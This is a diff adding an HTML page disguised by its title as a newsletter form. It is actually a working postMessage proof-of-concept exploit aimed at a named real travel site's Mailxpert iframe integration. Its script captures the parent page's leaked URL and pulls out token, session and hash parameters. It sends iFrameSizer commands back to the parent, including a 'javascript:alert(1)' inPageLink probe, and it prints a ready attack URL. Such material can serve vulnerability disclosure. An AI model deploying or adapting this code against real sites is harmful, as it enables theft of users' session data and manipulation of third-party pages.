@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Newsletter Form</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }
+        .log { background: #16213e; padding: 15px; border-radius: 8px; margin: 10px 0; }
+        .success { border-left: 4px solid #00ff88; }
+        .info { border-left: 4px solid #00aeff; }
+        pre { background: #0f0f23; padding: 10px; overflow-x: auto; border-radius: 4px; font-size: 12px; }
+        h1 { color: #00ff88; }
+        h2 { color: #00aeff; }
+        #captured { max-height: 400px; overflow-y: auto; }
+        .alert { background: #ff4444; color: white; padding: 20px; border-radius: 8px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h1>🎯 Mailxpert postMessage Capture PoC</h1>
+    
+    <div class="alert">
+        <strong>⚠️ Security Demonstration</strong><br>
+        This page captures data leaked via unsafe postMessage from the parent frame.
+    </div>
+    
+    <h2>📥 Captured Data from Parent Page</h2>
+    <div id="captured"></div>
+    
+    <h2>📤 Commands Sent to Parent</h2>
+    <div id="payloads"></div>
+
+    <script>
+    const capturedDiv = document.getElementById('captured');
+    const payloadsDiv = document.getElementById('payloads');
+    let messageCount = 0;
+    
+    function log(type, title, data) {
+        const div = document.createElement('div');
+        div.className = 'log ' + type;
+        const timestamp = new Date().toISOString();
+        div.innerHTML = '<strong>[' + timestamp + '] ' + title + '</strong><pre>' + 
+            (typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data)) + '</pre>';
+        capturedDiv.insertBefore(div, capturedDiv.firstChild);
+    }
+    
+    function logPayload(title, data) {
+        const div = document.createElement('div');
+        div.className = 'log info';
+        div.innerHTML = '<strong>' + title + '</strong><pre>' + 
+            (typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data)) + '</pre>';
+        payloadsDiv.appendChild(div);
+    }
+
+    // Listen for postMessage from parent (dertour-suisse.com)
+    window.addEventListener('message', function(event) {
+        messageCount++;
+        
+        log('success', '📥 Message #' + messageCount + ' from ' + event.origin, {
+            origin: event.origin,
+            data: event.data
+        });
+        
+        // Extract sensitive data from leaked URL
+        if (event.data && event.data.href) {
+            try {
+                const url = new URL(event.data.href);
+                log('success', '🔗 Leaked Parent URL', event.data.href);
+                
+                const params = Object.fromEntries(url.searchParams);
+                if (Object.keys(params).length > 0) {
+                    log('success', '🔑 URL Parameters Extracted', params);
+                }
+                
+                // Check for sensitive tokens
+                const sensitiveParams = ['token', 'auth', 'session', 'key', 'hash', 'contactHash', 'id', 'user'];
+                for (const param of sensitiveParams) {
+                    if (url.searchParams.has(param)) {
+                        log('success', '⚠️ SENSITIVE: ' + param, url.searchParams.get(param));
+                    }
+                }
+            } catch(e) {
+                log('info', 'URL parse error', e.message);
+            }
+        }
+        
+        // Try to send commands back to manipulate parent page
+        if (window.parent && window.parent !== window) {
+            setTimeout(function() {
+                // Scroll manipulation
+                try {
+                    const scrollCmd = '[iFrameSizer]formContentId:9999:0:scrollTo';
+                    window.parent.postMessage(scrollCmd, '*');
+                    logPayload('Scroll manipulation sent', scrollCmd);
+                } catch(e) {}
+                
+                // Try inPageLink (DOM lookup)
+                try {
+                    const linkCmd = '[iFrameSizer]formContentId:0:0:inPageLink:javascript:alert(1)';
+                    window.parent.postMessage(linkCmd, '*');
+                    logPayload('inPageLink probe sent', linkCmd);
+                } catch(e) {}
+            }, 100);
+        }
+    });
+
+    // Log our context
+    log('info', '⏳ PoC Loaded - Waiting for postMessage...', {
+        ourLocation: window.location.href,
+        inIframe: window.parent !== window,
+        referrer: document.referrer
+    });
+    
+    // Instructions
+    log('info', '📋 Attack URL', 
+        'https://www.dertour-suisse.com/dae/sales-newsflash-abonnieren?mxsrc=' + 
+        encodeURIComponent(window.location.href.split('?')[0]));
+    </script>
+</body>
+</html>
